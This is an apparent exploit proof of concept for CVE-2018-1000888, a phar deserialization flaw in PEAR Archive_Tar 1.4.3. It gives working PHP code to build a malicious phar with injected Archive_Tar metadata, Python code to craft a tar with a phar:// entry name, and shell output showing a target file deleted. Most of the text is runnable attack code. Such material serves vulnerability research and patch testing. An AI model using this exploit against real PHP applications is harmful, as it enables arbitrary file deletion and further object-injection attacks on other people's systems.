
Date:
  January 10, 2019

Author:
  farisv

Vendor Homepage:
  https://pear.php.net/package/Archive_Tar/

Vulnerable Package Link:
  http://download.pear.php.net/package/Archive_Tar-1.4.3.tgz

CVE:
  CVE-2018-1000888



Steps to reproduce object injection and arbitrary file deletion:

1. Make sure that PHP & PEAR are installed.
2. Download vulnerable PEAR Archive_Tar.

$ wget http://download.pear.php.net/package/Archive_Tar-1.4.3.tgz
$ tar xfz Archive_Tar-1.4.3.tgz
$ cd Archive_Tar-1.4.3

3. Create vulnerable code (vulnerable.php).

```
<?php
  require &#039;Archive/Tar.php&#039;;

  $exploit = new Archive_Tar(&#039;exploit.tar&#039;);
  $exploit->extract();
```

4. Create dummy file /tmp/test.

$ touch /tmp/test

5. Genereate exploit.phar with the following PHP code and place the exploit.phar in the same directory with vulnerable.php.

```
<?php

class Archive_Tar {
  public $_temp_tarname;
}

$phar = new Phar(&#039;exploit.phar&#039;);
$phar->startBuffering();
$phar->addFromString(&#039;test.txt&#039;, &#039;text&#039;);
$phar->setStub(&#039;<?php __HALT_COMPILER(); ? >&#039;);

$object = new Archive_Tar;
$object->_temp_tarname = &#039;/tmp/test&#039;;
$phar->setMetadata($object);
$phar->stopBuffering();
```

6. Create exploit.tar with the following Python code.

```
import tarfile

tf = tarfile.open(&#039;exploit.tar&#039;, &#039;w&#039;)

tf.add(&#039;/dev/null&#039;, &#039;phar://exploit.phar&#039;)
tf.close()
```

7. Execute vulnerable.php to trigger object injection to delete /tmp/test.

$ ls -alt /tmp/test
-rw-rw-r-- 1 vagrant vagrant 0 Jan  9 16:41 /tmp/test
$ php vulnerable.php
$ ls -alt /tmp/test
ls: cannot access &#039;/tmp/test&#039;: No such file or directory

